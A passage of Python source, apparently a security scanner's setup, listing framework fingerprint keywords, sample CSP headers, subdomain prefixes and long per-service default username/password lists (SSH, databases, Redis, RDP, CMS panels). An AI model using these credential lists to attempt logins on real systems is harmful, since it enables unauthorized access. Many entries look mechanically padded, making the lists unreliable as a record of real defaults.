                "polling", "websocket", "transport", "upgrade"
            ],
            
            "WebSocket": [
                "websocket", "ws://", "wss://", "WebSocket(",
                "onopen", "onmessage", "onerror", "onclose",
                "send(", "close(", "binaryType", "bufferedAmount",
                "extensions", "protocol", "readyState", "url",
                "CONNECTING", "OPEN", "CLOSING", "CLOSED",
                "CloseEvent", "MessageEvent", "ErrorEvent",
                "WebSocketServer", "ws.Server", "wss.Server",
                "server.on('connection',", "server.on('error',",
                "server.on('headers',", "server.on('listening',",
                "server.on('close',", "server.on('upgrade',",
                "server.clients", "server.close", "server.address"
            ],
            

            "Jest": [
                "jest", "jest.config.js", "jest.setup.js",
                "describe(", "test(", "it(", "beforeEach(",
                "afterEach(", "beforeAll(", "afterAll(",
                "expect(", ".toBe(", ".toEqual(", ".toMatch(",
                ".toContain(", ".toThrow(", ".toHaveBeenCalled(",
                ".toHaveBeenCalledTimes(", ".toHaveBeenCalledWith(",
                ".toHaveBeenLastCalledWith(", ".toHaveBeenNthCalledWith(",
                ".toHaveReturned(", ".toHaveReturnedTimes(",
                ".toHaveReturnedWith(", ".toHaveLastReturnedWith(",
                ".toHaveNthReturnedWith(", ".resolves.", ".rejects.",
                ".not.", ".and.", ".or.", ".withContext("
            ],
            
            "Cypress": [
                "cypress", "cypress.json", "cypress.env.json",
                "cypress/integration/", "cypress/fixtures/",
                "cypress/plugins/", "cypress/support/",
                "cy.visit(", "cy.get(", "cy.contains(",
                "cy.click(", "cy.type(", "cy.clear(",
                "cy.check(", "cy.uncheck(", "cy.select(",
                "cy.focus(", "cy.blur(", "cy.scrollIntoView(",
                "cy.scrollTo(", "cy.trigger(", "cy.wait(",
                "cy.intercept(", "cy.route(", "cy.server(",
                "cy.request(", "cy.fixture(", "cy.readFile(",
                "cy.writeFile(", "cy.exec(", "cy.task(",
                "cy.log(", "cy.screenshot(", "cy.wrap("
            ],
            
            "Selenium": [
                "selenium", "webdriver", "chromedriver",
                "geckodriver", "edgedriver", "safaridriver",
                "driver.get(", "driver.find_element(",
                "driver.find_elements(", "driver.title",
                "driver.current_url", "driver.page_source",
                "driver.close(", "driver.quit(", "driver.forward(",
                "driver.back(", "driver.refresh(", "driver.execute_script(",
                "driver.execute_async_script(", "driver.get_cookie(",
                "driver.get_cookies(", "driver.add_cookie(",
                "driver.delete_cookie(", "driver.delete_all_cookies(",
                "driver.switch_to.alert", "driver.switch_to.window",
                "driver.switch_to.frame", "driver.switch_to.parent_frame",
                "driver.switch_to.default_content", "driver.save_screenshot("
            ]
        }
        
        self.default_credentials = {
            "ssh": [
                ("root", "root"),
                ("admin", "admin"),
                ("administrator", "administrator"),
                ("test", "test"),
                ("user", "user"),
                ("guest", "guest"),
                ("ubuntu", "ubuntu"),
                ("centos", "centos"),
                ("debian", "debian"),
                ("fedora", "fedora"),
                ("pi", "raspberry"),
                ("vagrant", "vagrant"),
                ("docker", "tcuser"),
                ("oracle", "oracle"),
                ("postgres", "postgres"),
                ("mysql", "mysql"),
                ("ftp", "ftp"),
                ("anonymous", ""),
                ("backup", "backup"),
                ("operator", "operator"),
                ("sysadmin", "sysadmin"),
                ("webadmin", "webadmin"),
                ("superuser", "superuser"),
                ("support", "support"),
                ("service", "service"),
                ("demo", "demo"),
                ("development", "development"),
                ("production", "production"),
                ("staging", "staging"),
                ("test", "123456"),
                ("test", "password"),
                ("admin", "123456"),
                ("admin", "password123"),
                ("admin", "admin123"),
                ("admin", "administrator"),
                ("root", "password"),
                ("root", "123456"),
                ("root", "toor"),
                ("root", "root123"),
                ("root", "admin"),
                ("root", "default"),
                ("root", "pass"),
                ("root", "pass123"),
                ("root", "root@123"),
                ("root", "root1234"),
                ("root", "rootpassword"),
                ("admin", "P@ssw0rd"),
                ("admin", "Admin@123"),
                ("administrator", "P@ssw0rd"),
                ("administrator", "Admin@123"),
                ("root", "P@ssw0rd"),
                ("root", "Root@123"),
                ("root", "Root123!"),
                ("admin", "admin@123"),
                ("admin", "admin123!"),
                ("root", "root@123!"),
                ("root", "Root@123!"),
                ("admin", "Admin@123!"),
                ("administrator", "Administrator@123"),
                ("admin", "admin123456"),
                ("root", "root123456"),
                ("administrator", "administrator123"),
                ("admin", "adminadmin"),
                ("root", "rootroot"),
                ("admin", "admin@2023"),
                ("root", "root@2023"),
                ("admin", "admin@2024"),
                ("root", "root@2024"),
                ("admin", "Admin123456"),
                ("root", "Root123456"),
                ("admin", "admin!@#"),
                ("root", "root!@#"),
                ("admin", "admin#123"),
                ("root", "root#123"),
                ("admin", "admin_123"),
                ("root", "root_123"),
                ("admin", "admin-123"),
                ("root", "root-123"),
                ("admin", "admin.123"),
                ("root", "root.123"),
                ("admin", "admin123admin"),
                ("root", "root123root"),
            ],
            

            "ftp": [
                ("anonymous", ""),
                ("ftp", "ftp"),
                ("admin", "admin"),
                ("root", "root"),
                ("test", "test"),
                ("user", "user"),
                ("guest", "guest"),
                ("anonymous", "anonymous"),
                ("anonymous", "email@example.com"),
                ("ftpuser", "ftpuser"),
                ("ftpadmin", "ftpadmin"),
                ("backup", "backup"),
                ("web", "web"),
                ("www", "www"),
                ("public", "public"),
                ("upload", "upload"),
                ("download", "download"),
                ("data", "data"),
                ("files", "files"),
                ("media", "media"),
                ("content", "content"),
                ("assets", "assets"),
                ("static", "static"),
                ("shared", "shared"),
                ("common", "common"),
                ("global", "global"),
                ("local", "local"),
                ("remote", "remote"),
                ("server", "server"),
                ("client", "client"),
                ("host", "host"),
                ("node", "node"),
                ("instance", "instance"),
                ("container", "container"),
                ("docker", "docker"),
                ("kubernetes", "kubernetes"),
                ("k8s", "k8s"),
                ("aws", "aws"),
                ("azure", "azure"),
                ("gcp", "gcp"),
                ("cloud", "cloud"),
                ("dev", "dev"),
                ("prod", "prod"),
                ("stage", "stage"),
                ("qa", "qa"),
                ("uat", "uat"),
                ("test", "test123"),
                ("admin", "ftpadmin"),
                ("administrator", "ftpadmin"),
                ("root", "ftproot"),
                ("sysadmin", "ftpsysadmin"),
                ("webadmin", "ftpwebadmin"),
                ("ftp", "ftp123"),
                ("ftp", "ftp@123"),
                ("ftp", "Ftp@123"),
                ("anonymous", "ftp"),
                ("anonymous", "anonymous123"),
                ("ftp", "password"),
                ("ftp", "123456"),
                ("admin", "ftppass"),
                ("admin", "ftp@admin"),
                ("root", "ftp@root"),
                ("user", "ftp@user"),
                ("guest", "ftp@guest"),
                ("ftpuser", "ftpuser123"),
                ("ftpadmin", "ftpadmin123"),
                ("backup", "backup123"),
                ("web", "web123"),
                ("www", "www123"),
                ("public", "public123"),
                ("upload", "upload123"),
                ("download", "download123"),
                ("data", "data123"),
                ("files", "files123"),
                ("media", "media123"),
                ("content", "content123"),
                ("assets", "assets123"),
                ("static", "static123"),
                ("shared", "shared123"),
                ("common", "common123"),
                ("global", "global123"),
                ("local", "local123"),
                ("remote", "remote123"),
                ("server", "server123"),
                ("client", "client123"),
                ("host", "host123"),
                ("node", "node123"),
                ("instance", "instance123"),
                ("container", "container123"),
                ("docker", "docker123"),
                ("kubernetes", "kubernetes123"),
                ("k8s", "k8s123"),
                ("aws", "aws123"),
                ("azure", "azure123"),
                ("gcp", "gcp123"),
                ("cloud", "cloud123"),
                ("dev", "dev123"),
                ("prod", "prod123"),
                ("stage", "stage123"),
                ("qa", "qa123"),
                ("uat", "uat123"),
            ],
            

            "mysql": [
                ("root", ""),
                ("root", "root"),
                ("root", "password"),
                ("root", "123456"),
                ("root", "mysql"),
                ("admin", "admin"),
                ("admin", "password"),
                ("admin", "123456"),
                ("test", "test"),
                ("user", "user"),
                ("mysql", "mysql"),
                ("mysql", "password"),
                ("mysql", "123456"),
                ("dbadmin", "dbadmin"),
                ("database", "database"),
                ("dba", "dba"),
                ("sysdba", "sysdba"),
                ("system", "system"),
                ("oracle", "oracle"),
                ("postgres", "postgres"),
                ("sql", "sql"),
                ("sqladmin", "sqladmin"),
                ("web", "web"),
                ("webapp", "webapp"),
                ("app", "app"),
                ("application", "application"),
                ("backend", "backend"),
                ("frontend", "frontend"),
                ("api", "api"),
                ("service", "service"),
                ("microservice", "microservice"),
                ("container", "container"),
                ("docker", "docker"),
                ("k8s", "k8s"),
                ("kube", "kube"),
                ("aws", "aws"),
                ("azure", "azure"),
                ("gcp", "gcp"),
                ("cloud", "cloud"),
                ("dev", "dev"),
                ("prod", "prod"),
                ("stage", "stage"),
                ("qa", "qa"),
                ("uat", "uat"),
                ("test", "test123"),
                ("development", "development"),
                ("production", "production"),
                ("staging", "staging"),
                ("testing", "testing"),
                ("quality", "quality"),
                ("assurance", "assurance"),
                ("admin", "P@ssw0rd"),
                ("root", "P@ssw0rd"),
                ("mysql", "P@ssw0rd"),
                ("admin", "Admin@123"),
                ("root", "Root@123"),
                ("mysql", "MySQL@123"),
                ("admin", "Admin123!"),
                ("root", "Root123!"),
                ("mysql", "MySQL123!"),
                ("root", "root@mysql"),
                ("admin", "admin@mysql"),
                ("mysql", "mysql@123"),
                ("root", "toor"),
                ("admin", "admin123456"),
                ("root", "root123456"),
                ("mysql", "mysql123456"),
                ("root", ""),
                ("admin", ""),
                ("mysql", ""),
                ("root", "123"),
                ("admin", "123"),
                ("mysql", "123"),
                ("root", "1234"),
                ("admin", "1234"),
                ("mysql", "1234"),
                ("root", "12345"),
                ("admin", "12345"),
                ("mysql", "12345"),
                ("root", "12345678"),
                ("admin", "12345678"),
                ("mysql", "12345678"),
                ("root", "123456789"),
                ("admin", "123456789"),
                ("mysql", "123456789"),
                ("root", "1234567890"),
                ("admin", "1234567890"),
                ("mysql", "1234567890"),
                ("root", "qwerty"),
                ("admin", "qwerty"),
                ("mysql", "qwerty"),
                ("root", "password123"),
                ("admin", "password123"),
                ("mysql", "password123"),
                ("root", "admin123"),
                ("admin", "admin123"),
                ("mysql", "admin123"),
                ("root", "mysql123"),
                ("admin", "mysql123"),
                ("mysql", "mysql123"),
                ("root", "root123"),
                ("admin", "root123"),
                ("mysql", "root123"),
                ("root", "pass"),
                ("admin", "pass"),
                ("mysql", "pass"),
                ("root", "pass123"),
                ("admin", "pass123"),
                ("mysql", "pass123"),
                ("root", "secret"),
                ("admin", "secret"),
                ("mysql", "secret"),
                ("root", "secret123"),
                ("admin", "secret123"),
                ("mysql", "secret123"),
                ("root", "test123"),
                ("admin", "test123"),
                ("mysql", "test123"),
            ],
            

            "postgresql": [
                ("postgres", "postgres"),
                ("postgres", ""),
                ("postgres", "password"),
                ("postgres", "123456"),
                ("admin", "admin"),
                ("admin", "password"),
                ("admin", "123456"),
                ("test", "test"),
                ("user", "user"),
                ("pgadmin", "pgadmin"),
                ("postgres", "postgres123"),
                ("postgres", "postgres@123"),
                ("postgres", "Postgres@123"),
                ("postgres", "postgres123!"),
                ("postgres", "Postgres123!"),
                ("admin", "P@ssw0rd"),
                ("postgres", "P@ssw0rd"),
                ("admin", "Admin@123"),
                ("postgres", "Postgres@123"),
                ("admin", "Admin123!"),
                ("postgres", "Postgres123!"),
                ("dbadmin", "dbadmin"),
                ("database", "database"),
                ("dba", "dba"),
                ("sysdba", "sysdba"),
                ("system", "system"),
                ("oracle", "oracle"),
                ("mysql", "mysql"),
                ("sql", "sql"),
                ("sqladmin", "sqladmin"),
                ("web", "web"),
                ("webapp", "webapp"),
                ("app", "app"),
                ("application", "application"),
                ("backend", "backend"),
                ("frontend", "frontend"),
                ("api", "api"),
                ("service", "service"),
                ("microservice", "microservice"),
                ("container", "container"),
                ("docker", "docker"),
                ("k8s", "k8s"),
                ("kube", "kube"),
                ("aws", "aws"),
                ("azure", "azure"),
                ("gcp", "gcp"),
                ("cloud", "cloud"),
                ("dev", "dev"),
                ("prod", "prod"),
                ("stage", "stage"),
                ("qa", "qa"),
                ("uat", "uat"),
                ("test", "test123"),
                ("development", "development"),
                ("production", "production"),
                ("staging", "staging"),
                ("testing", "testing"),
                ("quality", "quality"),
                ("assurance", "assurance"),
                ("postgres", "postgresql"),
                ("postgres", "postgresql123"),
                ("postgres", "postgresql@123"),
                ("postgres", "PostgreSQL@123"),
                ("postgres", "postgresql123!"),
                ("postgres", "PostgreSQL123!"),
                ("postgres", "pgsql"),
                ("postgres", "pgsql123"),
                ("postgres", "pgsql@123"),
                ("postgres", "PgSQL@123"),
                ("postgres", "pgsql123!"),
                ("postgres", "PgSQL123!"),
                ("postgres", "pg"),
                ("postgres", "pg123"),
                ("postgres", "pg@123"),
                ("postgres", "PG@123"),
                ("postgres", "pg123!"),
                ("postgres", "PG123!"),
                ("postgres", "12345678"),
                ("postgres", "123456789"),
                ("postgres", "1234567890"),
                ("postgres", "qwerty"),
                ("postgres", "password123"),
                ("postgres", "admin123"),
                ("postgres", "postgres123456"),
                ("postgres", "secret"),
                ("postgres", "secret123"),
                ("postgres", "test123"),
                ("postgres", "pass"),
                ("postgres", "pass123"),
                ("postgres", "root"),
                ("postgres", "root123"),
                ("postgres", "toor"),
                ("postgres", "administrator"),
                ("postgres", "administrator123"),
                ("postgres", "sysadmin"),
                ("postgres", "sysadmin123"),
                ("postgres", "webadmin"),
                ("postgres", "webadmin123"),
                ("postgres", "superuser"),
                ("postgres", "superuser123"),
                ("postgres", "backup"),
                ("postgres", "backup123"),
                ("postgres", "operator"),
                ("postgres", "operator123"),
                ("postgres", "service"),
                ("postgres", "service123"),
                ("postgres", "demo"),
                ("postgres", "demo123"),
                ("postgres", "development"),
                ("postgres", "development123"),
                ("postgres", "production"),
                ("postgres", "production123"),
                ("postgres", "staging"),
                ("postgres", "staging123"),
                ("postgres", "testing"),
                ("postgres", "testing123"),
                ("postgres", "qa"),
                ("postgres", "qa123"),
                ("postgres", "uat"),
                ("postgres", "uat123"),
            ],
            

            "redis": [
                ("", ""),
                ("default", ""),
                ("redis", ""),
                ("redis", "redis"),
                ("redis", "password"),
                ("redis", "123456"),
                ("admin", ""),
                ("admin", "admin"),
                ("admin", "password"),
                ("admin", "123456"),
                ("test", ""),
                ("test", "test"),
                ("user", ""),
                ("user", "user"),
                ("root", ""),
                ("root", "root"),
                ("root", "password"),
                ("root", "123456"),
                ("guest", ""),
                ("guest", "guest"),
                ("anonymous", ""),
                ("public", ""),
                ("default", "default"),
                ("default", "password"),
                ("default", "123456"),
                ("redis", "redis123"),
                ("redis", "redis@123"),
                ("redis", "Redis@123"),
                ("redis", "redis123!"),
                ("redis", "Redis123!"),
                ("admin", "P@ssw0rd"),
                ("redis", "P@ssw0rd"),
                ("admin", "Admin@123"),
                ("redis", "Redis@123"),
                ("admin", "Admin123!"),
                ("redis", "Redis123!"),
                ("dbadmin", "dbadmin"),
                ("database", "database"),
                ("dba", "dba"),
                ("sysdba", "sysdba"),
                ("system", "system"),
                ("cache", "cache"),
                ("caching", "caching"),
                ("session", "session"),
                ("sessions", "sessions"),
                ("queue", "queue"),
                ("queues", "queues"),
                ("message", "message"),
                ("messages", "messages"),
                ("broker", "broker"),
                ("brokers", "brokers"),
                ("pubsub", "pubsub"),
                ("publish", "publish"),
                ("subscribe", "subscribe"),
                ("stream", "stream"),
                ("streams", "streams"),
                ("channel", "channel"),
                ("channels", "channels"),
                ("topic", "topic"),
                ("topics", "topics"),
                ("event", "event"),
                ("events", "events"),
                ("notification", "notification"),
                ("notifications", "notifications"),
                ("alert", "alert"),
                ("alerts", "alerts"),
                ("log", "log"),
                ("logs", "logs"),
                ("monitor", "monitor"),
                ("monitoring", "monitoring"),
                ("metric", "metric"),
                ("metrics", "metrics"),
                ("stats", "stats"),
                ("statistics", "statistics"),
                ("analytics", "analytics"),
                ("analysis", "analysis"),
                ("report", "report"),
                ("reports", "reports"),
                ("dashboard", "dashboard"),
                ("dashboards", "dashboards"),
                ("visualization", "visualization"),
                ("visualizations", "visualizations"),
                ("graph", "graph"),
                ("graphs", "graphs"),
                ("chart", "chart"),
                ("charts", "charts"),
                ("plot", "plot"),
                ("plots", "plots"),
                ("diagram", "diagram"),
                ("diagrams", "diagrams"),
                ("map", "map"),
                ("maps", "maps"),
                ("geo", "geo"),
                ("geospatial", "geospatial"),
                ("location", "location"),
                ("locations", "locations"),
                ("position", "position"),
                ("positions", "positions"),
                ("coordinate", "coordinate"),
                ("coordinates", "coordinates"),
                ("address", "address"),
                ("addresses", "addresses"),
                ("place", "place"),
                ("places", "places"),
                ("venue", "venue"),
                ("venues", "venues"),
                ("site", "site"),
                ("sites", "sites"),
                ("redis", "123"),
                ("redis", "1234"),
                ("redis", "12345"),
                ("redis", "12345678"),
                ("redis", "123456789"),
                ("redis", "1234567890"),
                ("redis", "qwerty"),
                ("redis", "password123"),
                ("redis", "admin123"),
                ("redis", "redis123456"),
                ("redis", "secret"),
                ("redis", "secret123"),
                ("redis", "test123"),
                ("redis", "pass"),
                ("redis", "pass123"),
                ("redis", "root"),
                ("redis", "root123"),
                ("redis", "toor"),
                ("redis", "administrator"),
                ("redis", "administrator123"),
                ("redis", "sysadmin"),
                ("redis", "sysadmin123"),
                ("redis", "webadmin"),
                ("redis", "webadmin123"),
                ("redis", "superuser"),
                ("redis", "superuser123"),
                ("redis", "backup"),
                ("redis", "backup123"),
                ("redis", "operator"),
                ("redis", "operator123"),
                ("redis", "service"),
                ("redis", "service123"),
                ("redis", "demo"),
                ("redis", "demo123"),
                ("redis", "development"),
                ("redis", "development123"),
                ("redis", "production"),
                ("redis", "production123"),
                ("redis", "staging"),
                ("redis", "staging123"),
                ("redis", "testing"),
                ("redis", "testing123"),
                ("redis", "qa"),
                ("redis", "qa123"),
                ("redis", "uat"),
                ("redis", "uat123"),
                ("default", "redis"),
                ("default", "redis123"),
                ("default", "default123"),
                ("default", "password123"),
                ("default", "admin123"),
                ("default", "test123"),
                ("default", "user123"),
                ("default", "guest123"),
                ("default", "root123"),
            ],
            

            "mongodb": [
                ("admin", "admin"),
                ("admin", ""),
                ("admin", "password"),
                ("admin", "123456"),
                ("test", "test"),
                ("test", ""),
                ("test", "password"),
                ("test", "123456"),
                ("root", "root"),
                ("root", ""),
                ("root", "password"),
                ("root", "123456"),
                ("user", "user"),
                ("user", ""),
                ("user", "password"),
                ("user", "123456"),
                ("mongodb", "mongodb"),
                ("mongodb", ""),
                ("mongodb", "password"),
                ("mongodb", "123456"),
                ("mongo", "mongo"),
                ("mongo", ""),
                ("mongo", "password"),
                ("mongo", "123456"),
                ("dbadmin", "dbadmin"),
                ("dbadmin", ""),
                ("dbadmin", "password"),
                ("dbadmin", "123456"),
                ("database", "database"),
                ("database", ""),
                ("database", "password"),
                ("database", "123456"),
                ("dba", "dba"),
                ("dba", ""),
                ("dba", "password"),
                ("dba", "123456"),
                ("sysdba", "sysdba"),
                ("sysdba", ""),
                ("sysdba", "password"),
                ("sysdba", "123456"),
                ("system", "system"),
                ("system", ""),
                ("system", "password"),
                ("system", "123456"),
                ("oracle", "oracle"),
                ("oracle", ""),
                ("oracle", "password"),
                ("oracle", "123456"),
                ("postgres", "postgres"),
                ("postgres", ""),
                ("postgres", "password"),
                ("postgres", "123456"),
                ("mysql", "mysql"),
                ("mysql", ""),
                ("mysql", "password"),
                ("mysql", "123456"),
                ("sql", "sql"),
                ("sql", ""),
                ("sql", "password"),
                ("sql", "123456"),
                ("sqladmin", "sqladmin"),
                ("sqladmin", ""),
                ("sqladmin", "password"),
                ("sqladmin", "123456"),
                ("web", "web"),
                ("web", ""),
                ("web", "password"),
                ("web", "123456"),
                ("webapp", "webapp"),
                ("webapp", ""),
                ("webapp", "password"),
                ("webapp", "123456"),
                ("app", "app"),
                ("app", ""),
                ("app", "password"),
                ("app", "123456"),
                ("application", "application"),
                ("application", ""),
                ("application", "password"),
                ("application", "123456"),
                ("backend", "backend"),
                ("backend", ""),
                ("backend", "password"),
                ("backend", "123456"),
                ("frontend", "frontend"),
                ("frontend", ""),
                ("frontend", "password"),
                ("frontend", "123456"),
                ("api", "api"),
                ("api", ""),
                ("api", "password"),
                ("api", "123456"),
                ("service", "service"),
                ("service", ""),
                ("service", "password"),
                ("service", "123456"),
                ("microservice", "microservice"),
                ("microservice", ""),
                ("microservice", "password"),
                ("microservice", "123456"),
                ("container", "container"),
                ("container", ""),
                ("container", "password"),
                ("container", "123456"),
                ("docker", "docker"),
                ("docker", ""),
                ("docker", "password"),
                ("docker", "123456"),
                ("k8s", "k8s"),
                ("k8s", ""),
                ("k8s", "password"),
                ("k8s", "123456"),
                ("kube", "kube"),
                ("kube", ""),
                ("kube", "password"),
                ("kube", "123456"),
                ("aws", "aws"),
                ("aws", ""),
                ("aws", "password"),
                ("aws", "123456"),
                ("azure", "azure"),
                ("azure", ""),
                ("azure", "password"),
                ("azure", "123456"),
                ("gcp", "gcp"),
                ("gcp", ""),
                ("gcp", "password"),
                ("gcp", "123456"),
                ("cloud", "cloud"),
                ("cloud", ""),
                ("cloud", "password"),
                ("cloud", "123456"),
                ("dev", "dev"),
                ("dev", ""),
                ("dev", "password"),
                ("dev", "123456"),
                ("prod", "prod"),
                ("prod", ""),
                ("prod", "password"),
                ("prod", "123456"),
                ("stage", "stage"),
                ("stage", ""),
                ("stage", "password"),
                ("stage", "123456"),
                ("qa", "qa"),
                ("qa", ""),
                ("qa", "password"),
                ("qa", "123456"),
                ("uat", "uat"),
                ("uat", ""),
                ("uat", "password"),
                ("uat", "123456"),
                ("test", "test123"),
                ("test", "test@123"),
                ("test", "Test@123"),
                ("test", "test123!"),
                ("test", "Test123!"),
                ("admin", "P@ssw0rd"),
                ("admin", "Admin@123"),
                ("admin", "Admin123!"),
                ("mongodb", "P@ssw0rd"),
                ("mongodb", "MongoDB@123"),
                ("mongodb", "MongoDB123!"),
                ("root", "P@ssw0rd"),
                ("root", "Root@123"),
                ("root", "Root123!"),
                ("user", "P@ssw0rd"),
                ("user", "User@123"),
                ("user", "User123!"),
                ("admin", "admin123456"),
                ("admin", "admin@mongodb"),
                ("admin", "admin#mongodb"),
                ("admin", "admin_mongodb"),
                ("admin", "admin-mongodb"),
                ("admin", "admin.mongodb"),
                ("root", "root123456"),
                ("root", "root@mongodb"),
                ("root", "root#mongodb"),
                ("root", "root_mongodb"),
                ("root", "root-mongodb"),
                ("root", "root.mongodb"),
                ("mongodb", "mongodb123456"),
                ("mongodb", "mongodb@mongodb"),
                ("mongodb", "mongodb#mongodb"),
                ("mongodb", "mongodb_mongodb"),
                ("mongodb", "mongodb-mongodb"),
                ("mongodb", "mongodb.mongodb"),
                ("mongo", "mongo123456"),
                ("mongo", "mongo@mongodb"),
                ("mongo", "mongo#mongodb"),
                ("mongo", "mongo_mongodb"),
                ("mongo", "mongo-mongodb"),
                ("mongo", "mongo.mongodb"),
                ("admin", "123"),
                ("admin", "1234"),
                ("admin", "12345"),
                ("admin", "12345678"),
                ("admin", "123456789"),
                ("admin", "1234567890"),
                ("admin", "qwerty"),
                ("admin", "password123"),
                ("admin", "admin123"),
                ("admin", "mongodb123"),
                ("admin", "secret"),
                ("admin", "secret123"),
                ("admin", "test123"),
                ("admin", "pass"),
                ("admin", "pass123"),
                ("admin", "toor"),
                ("admin", "administrator"),
                ("admin", "administrator123"),
                ("admin", "sysadmin"),
                ("admin", "sysadmin123"),
                ("admin", "webadmin"),
                ("admin", "webadmin123"),
                ("admin", "superuser"),
                ("admin", "superuser123"),
                ("admin", "backup"),
                ("admin", "backup123"),
                ("admin", "operator"),
                ("admin", "operator123"),
                ("admin", "service"),
                ("admin", "service123"),
                ("admin", "demo"),
                ("admin", "demo123"),
                ("admin", "development"),
                ("admin", "development123"),
                ("admin", "production"),
                ("admin", "production123"),
                ("admin", "staging"),
                ("admin", "staging123"),
                ("admin", "testing"),
                ("admin", "testing123"),
                ("admin", "qa"),
                ("admin", "qa123"),
                ("admin", "uat"),
                ("admin", "uat123"),
            ],
            

            "telnet": [
                ("root", "root"),
                ("admin", "admin"),
                ("user", "user"),
                ("guest", "guest"),
                ("test", "test"),
                ("administrator", "administrator"),
                ("operator", "operator"),
                ("service", "service"),
                ("", ""),
            ],
            
            "smtp": [
                ("admin", "admin"),
                ("root", "root"),
                ("user", "user"),
                ("test", "test"),
                ("mail", "mail"),
                ("postmaster", "postmaster"),
                ("administrator", "administrator"),
                ("", ""),
            ],
            
            "pop3": [
                ("admin", "admin"),
                ("root", "root"),
                ("user", "user"),
                ("test", "test"),
                ("mail", "mail"),
                ("postmaster", "postmaster"),
                ("administrator", "administrator"),
            ],
            
            "imap": [
                ("admin", "admin"),
                ("root", "root"),
                ("user", "user"),
                ("test", "test"),
                ("mail", "mail"),
                ("postmaster", "postmaster"),
                ("administrator", "administrator"),
            ],
            
            "vnc": [
                ("", ""),
                ("password", "password"),
                ("vnc", "vnc"),
                ("admin", "admin"),
                ("root", "root"),
                ("123456", "123456"),
                ("qwerty", "qwerty"),
            ],
            
            "rdp": [
                ("Administrator", ""),
                ("Administrator", "Administrator"),
                ("Administrator", "password"),
                ("Administrator", "123456"),
                ("admin", "admin"),
                ("root", "root"),
                ("user", "user"),
                ("test", "test"),
            ],
            
            "snmp": [
                ("public", ""),
                ("private", ""),
                ("community", ""),
                ("admin", ""),
                ("root", ""),
                ("test", ""),
            ],
            
            "ldap": [
                ("cn=admin,dc=example,dc=com", "admin"),
                ("cn=root,dc=example,dc=com", "root"),
                ("cn=administrator,dc=example,dc=com", "administrator"),
                ("uid=admin,ou=people,dc=example,dc=com", "admin"),
                ("uid=root,ou=people,dc=example,dc=com", "root"),
                ("admin", "admin"),
                ("root", "root"),
                ("test", "test"),
                ("user", "user"),
            ],
            
            "oracle": [
                ("sys", "change_on_install"),
                ("system", "manager"),
                ("scott", "tiger"),
                ("dbsnmp", "dbsnmp"),
                ("outln", "outln"),
                ("admin", "admin"),
                ("root", "root"),
                ("test", "test"),
                ("user", "user"),
            ],
            
            "mssql": [
                ("sa", ""),
                ("sa", "sa"),
                ("sa", "password"),
                ("sa", "123456"),
                ("admin", "admin"),
                ("root", "root"),
                ("test", "test"),
                ("user", "user"),
                ("administrator", "administrator"),
            ],
            
            "elasticsearch": [
                ("elastic", "elastic"),
                ("admin", "admin"),
                ("root", "root"),
                ("test", "test"),
                ("user", "user"),
                ("", ""),
            ],
            
            "kibana": [
                ("elastic", "elastic"),
                ("admin", "admin"),
                ("kibana", "kibana"),
                ("kibana", "kibanapass"),
                ("test", "test"),
                ("user", "user"),
            ],
            
            "docker": [
                ("", ""),
                ("docker", "docker"),
                ("admin", "admin"),
                ("root", "root"),
                ("test", "test"),
            ],
            
            "kubernetes": [
                ("admin", "admin"),
                ("kubernetes", "kubernetes"),
                ("kube", "kube"),
                ("k8s", "k8s"),
                ("root", "root"),
                ("test", "test"),
            ],
            
            "jenkins": [
                ("admin", "admin"),
                ("jenkins", "jenkins"),
                ("root", "root"),
                ("test", "test"),
                ("user", "user"),
                ("", ""),
            ],
            
            "gitlab": [
                ("root", "5iveL!fe"),
                ("root", "password"),
                ("admin", "admin"),
                ("gitlab", "gitlab"),
                ("test", "test"),
                ("user", "user"),
            ],
            
            "wordpress": [
                ("admin", "admin"),
                ("administrator", "administrator"),
                ("root", "root"),
                ("test", "test"),
                ("user", "user"),
                ("wpadmin", "wpadmin"),
                ("wordpress", "wordpress"),
            ],
            
            "joomla": [
                ("admin", "admin"),
                ("administrator", "administrator"),
                ("root", "root"),
                ("test", "test"),
                ("user", "user"),
                ("superuser", "superuser"),
                ("manager", "manager"),
            ],
            
            "drupal": [
                ("admin", "admin"),
                ("administrator", "administrator"),
                ("root", "root"),
                ("test", "test"),
                ("user", "user"),
                ("drupal", "drupal"),
            ],
            
            "magento": [
                ("admin", "admin"),
                ("administrator", "administrator"),
                ("root", "root"),
                ("test", "test"),
                ("user", "user"),
                ("magento", "magento"),
            ],
            
            "opencart": [
                ("admin", "admin"),
                ("administrator", "administrator"),
                ("root", "root"),
                ("test", "test"),
                ("user", "user"),
                ("opencart", "opencart"),
            ],
        }
        
        self.csp_directives = [
            "default-src",
            "script-src",
            "style-src",
            "img-src",
            "connect-src",
            "font-src",
            "object-src",
            "media-src",
            "frame-src",
            "sandbox",
            "report-uri",
            "report-to",
            "base-uri",

            "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'",
            "default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline'; img-src 'self' data:",

            "default-src 'none'; script-src 'nonce-static123'; style-src 'self'; img-src 'self'; connect-src 'self'",

            "{\"default-src\": [\"'self'\"], \"script-src\": [\"'self'\", \"https://cdn.example.com\"]}",

            "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'",

            "default-src 'self'; script-src 'self' 'unsafe-eval'",
            "default-src data: blob: mediastream: filesystem:; script-src 'self' data:",
    
            "default-src 'self' *.cloudflare.com *.googleapis.com; script-src 'self' *.ajax.googleapis.com",
    
            "frame-ancestors 'none'; default-src 'self'",
    
            "default-src http: https:; upgrade-insecure-requests",
    
            "default-src 'self'; report-uri /csp-report; report-to csp-endpoint",
    
            "default-src 'self'; connect-src 'self' ws://localhost:8080 wss://example.com",
    
            "default-src 'self'; worker-src 'self' blob:",
    
            "sandbox allow-scripts allow-same-origin; default-src 'self'",
            "require-trusted-types-for 'script'; trusted-types default",
            "default-src 'self'; upgrade-insecure-requests; block-all-mixed-content",
            "default-src 'self'; form-action 'self'; frame-ancestors 'none'",
            "default-src 'self'; navigate-to 'self'",
            "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'; font-src 'self'; connect-src 'self'; frame-src 'none'; object-src 'none'; media-src 'self'; sandbox; report-uri /csp-violation-report"
        ]
        
        self.subdomain_prefixes = [
            'www', 'mail', 'ftp', 'smtp', 'pop', 'imap', 'webmail',
            'admin', 'administrator', 'secure', 'ssl', 'vpn', 'portal',
            'test', 'testing', 'dev', 'development', 'staging', 'prod',
